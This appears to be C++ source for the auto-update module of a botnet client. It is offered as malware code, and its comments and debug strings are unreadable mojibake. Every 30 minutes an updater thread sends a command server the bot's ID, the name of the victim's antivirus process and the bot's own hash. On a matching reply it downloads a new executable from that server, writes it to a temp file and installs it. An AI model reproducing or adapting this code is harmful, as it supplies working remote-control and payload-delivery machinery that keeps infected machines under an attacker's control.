//---------------------------------------------------------------------------

#pragma hdrstop

#include "BotAutoUpdate.h"
#include "BotCore.h"
#include "md5.h"
#include "BotDef.h"
//---------------------------------------------------------------------------



#include "BotDebug.h"

namespace BotAutoUpdate
{
    #include "DbgTemplates.h"
}

#define BAUDBG  BotAutoUpdate::DBGOutMessage<>



//****************************************************************************
//                                  TBotUpdater
//****************************************************************************
TBotUpdater::TBotUpdater()
	: TBotThread(false)
{
//	Interval = 5 * 60 * 1000;
//	Interval = 20 * 1000;
	Interval = 30 * 60 * 1000;

	Start();
}
//----------------------------------------------------------

void TBotUpdater::DoExecute()
{
	// ��������� ���� ��������������� ���������� ����
	pSleep(4000);
	while (!Terminated())
	{
		DWORD UpdateInterval = Interval;

		Update(UpdateInterval);

		pSleep(UpdateInterval);
	}

}
//----------------------------------------------------------

void TBotUpdater::Update(DWORD &UpdateInterval)
{
	// ������� ��������� �������������� ���������� ����
	BAUDBG("��������������", "����������� ����� ������ ����");
	// �������� ���������� � ������ ������
	const static DWORD ErrorInterval = 60000;

	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_BOT);
	if (!URL)
	{
		BAUDBG("��������������", "������ �� ��������");
		UpdateInterval = ErrorInterval;
		return;
	}

	// ��������� ������
	string UID = GenerateBotID2();
	string AV  = GetAntiVirusProcessName();
	string MD5 = BOT::BotExeMD5();


	TBotStrings Fields;

	Fields.AddValue(HTTP_FIELD_UID,     UID);
	Fields.AddValue(HTTP_FIELD_ANTIVIR, AV);
	Fields.AddValue(HTTP_FIELD_MD5,     MD5);

	BAUDBG("��������������", "��������� �������: \r\n UID: %s\r\n AV: %s\r\n MD5: %s", UID.t_str(), AV.t_str(), MD5.t_str());

	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword2();
	#else
		THTTP HTTP;
	#endif


	string Buf;

	HTTP.CheckOkCode = false;
    bool Done = HTTP.Post(URL, &Fields, Buf);

	BAUDBG("��������������", "����� �������: Code: %d; Data:\r\n%s", HTTP.Response.Code, Buf.t_str());

	if (Done && HTTP.Response.Code == 403 && !Buf.IsEmpty())
	{
		// ��������� ����������
		TBotStrings Values;
		Values.SetText(Buf);

		string FileName = Values.GetValue("file_name");
		MD5 = Values.GetValue("md5");


		if (!FileName.IsEmpty() && !MD5.IsEmpty())
		{
			TURL URL;

			URL.Host     = HTTP.Request.Host;
			URL.Path     = "cfg";
			URL.Document = FileName;

			string FileURL = URL.URL();


			// ��������� � ������������� ����� ������
			DownloadAndSetup(FileURL, MD5);
        }
    }

	STR::Free(URL);

}
//----------------------------------------------------------

void TBotUpdater::DownloadAndSetup(const string &FileURL, const string &MD5)
{
	// ������� �������� � ������������� ����� ������ ����
	BAUDBG("��������������", "���������� ����� ������. ���������");
	TBotMemoryStream Data;
	THTTP HTTP;

	if (HTTP.Get(FileURL.t_str(), &Data))
	{
		// ���� ��������, ��������� md5 ���
		string Hash = CalcMd5SummForBuffer(Data.Memory(), Data.Size());
		BAUDBG("��������������", "��������� %d ����. md5 %s", Data.Size(), Hash.t_str());

		if (Hash != MD5)
		{
			BAUDBG("��������������", "������ �������� �����. ��5 �� ���������");
			File::WriteBufferA("c:\\err_bl.exe", Data.Memory(), Data.Size());
        	return;
		}

		{
			// ���� ������� ������, ������������� ���
			PCHAR Name = File::GetTempNameA();

			File::WriteBufferA(Name, Data.Memory(), Data.Size());
			BAUDBG("��������������", "����� ������ ���� ������� ���������. ��������� ���������.");

			// ��������� ������� ���������
			Bot->SaveSettings();

			// ������������� ����� ������
			if (MakeUpdate(Name))
			{
            	BAUDBG("��������������", "����� ������ ���� ������� �����������.");
            }

			STR::Free(Name);
        }
	}
}
//----------------------------------------------------------



//--------------------------------------------------
//  StartAutoUpdate - ������� ���������
//  �������������� ���������� ����
//--------------------------------------------------
void StartAutoUpdate()
{
    new TBotUpdater();
}
